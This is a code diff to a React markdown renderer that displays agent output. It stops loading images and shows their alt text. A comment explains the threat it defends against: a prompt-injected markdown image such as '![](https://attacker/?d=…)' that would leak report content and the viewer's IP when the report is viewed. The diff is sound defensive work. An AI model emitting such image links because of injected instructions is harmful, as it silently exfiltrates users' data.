@@ -18,6 +18,10 @@ const components: Components = {
   a: ({ node: _node, href, ...props }) => (
     <a href={href} {...props} {...(href && /^https?:/.test(href) ? { target: "_blank", rel: "noopener noreferrer" } : {})} />
   ),
+  // Never load images from model output: the browser fetches an image as soon
+  // as the report is viewed, so a prompt-injected ![](https://attacker/?d=…)
+  // would leak report content (and the viewer's IP) with zero clicks. Show the alt text.
+  img: ({ alt }) => (alt ? <span>{alt}</span> : null),
 };
 
 /** Markdown from the API (agent output / final report), GFM tables included. */
